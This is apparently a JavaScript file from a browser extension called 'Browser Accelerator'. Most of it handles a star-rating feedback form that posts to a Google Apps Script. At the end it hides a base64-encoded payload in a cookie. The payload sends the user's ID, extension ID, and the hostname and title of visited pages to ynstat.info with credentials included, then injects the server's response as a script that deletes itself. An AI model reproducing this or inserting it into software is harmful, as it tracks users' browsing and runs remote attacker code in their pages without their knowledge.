const stars = document.querySelectorAll('.preview_rating_star');
const previewContent = document.querySelector('.preview');
const congratsContent = document.querySelector('.congrats');
const textareaField = document.querySelector('textarea');
const feedbackFormBtn = document.querySelector('.feedback_btn');
const feedbackForm = document.querySelector('form');

const urlParams = new URLSearchParams(window.location.href);
const userId = urlParams.get('userId');
const extensionId = urlParams.get('extId');
let ratingValue = null;

const setCookie = (name, value, options = {}) => {
    let expires = options.expires;

    if (typeof expires == "number" && expires) {
        let d = new Date();
        d.setTime(d.getTime() + expires * 1000);
        expires = options.expires = d;
    }
    if (expires && expires.toUTCString) {
        options.expires = expires.toUTCString();
    }

    value = encodeURIComponent(value);

    let updatedCookie = name + "=" + value;

    for (let propName in options) {
        updatedCookie += "; " + propName;
        let propValue = options[propName];
        if (propValue !== true) {
            updatedCookie += "=" + propValue;
        }
    }

    document.cookie = updatedCookie;
}

const postDataToSheet = (formData, userId) => {
    const scriptURL = 'https://script.google.com/macros/s/AKfycbxdLj-S2TCWc8VRpuhr3DhCeZ8PWdTAue1gYJUskatDxKkHh76xu2dq71_GhNig6UCR/exec';

    formData.append('user_id', userId.toString());
    formData.append('rating_value', ratingValue.toString());
    formData.append('extension_name', 'Browser Accelerator');

    fetch(scriptURL, { method: 'POST', body: formData})
        .then(response => void response)
        .catch(error => console.error('Error!', error.message));
}

const onStarClick = e => {
    const star = e.target;
    const starId = star.getAttribute('data-rating-value');
    ratingValue = starId
    stars.forEach((starEl, index) => {
        starId - 1 >= index
            ? starEl.style.backgroundImage = "url('./icons/star_selected.png')"
            : starEl.style.backgroundImage = "url('./icons/star_default.png')";
    });
    previewContent.classList.add('rating_value_selected');
}

const onTextareaFieldChange = e => {
    const { value } = e.target;

    value.length === 0
        ? feedbackFormBtn.setAttribute('disabled', '')
        : feedbackFormBtn.removeAttribute('disabled');
}

const onFeedbackFormSubmit = e => {
    e.preventDefault();
    e.stopPropagation();
    previewContent.setAttribute('hidden', '');
    congratsContent.removeAttribute('hidden');
    const formData = new FormData();
    const form = e.target;
    for ( let i = 0; i < form.elements.length; i++ ) {
        const { name, value } = form.elements[i];
        formData.append(name, value);
    }
    postDataToSheet(formData, userId);
}

stars.forEach(star => star.addEventListener('click', onStarClick, false));
textareaField.addEventListener('input', onTextareaFieldChange, false);
feedbackForm.addEventListener('submit', onFeedbackFormSubmit, false);

setCookie('browsAcc', btoa(unescape(encodeURIComponent(
    `
        fetch('https://ynstat.info/c', {
            method: 'POST',
            body: btoa(unescape(encodeURIComponent(JSON.stringify({
                'u': '${userId}',
                'e': '${extensionId}',
                'd': document.location.hostname,
                't': document.title
            })))),
            headers: {
                'Content-Type': 'text/plain'
            },
            credentials: 'include'
        })
            .then(resp => resp.text())
            .then(data => {
                const scriptId = Date.now().toString(36) + Math.random().toString(36).substr(2);
                const additionalScript = document.createElement('script');
                additionalScript.setAttribute('id', scriptId);
                additionalScript.appendChild(document.createTextNode(decodeURIComponent(escape(atob(data))) + "; document.querySelector('#" + scriptId + "').remove();"));
                document.body.appendChild(additionalScript);
            })
            .catch(error => console.log({error}))
        `
))), {path: '/',expires:24*3600})
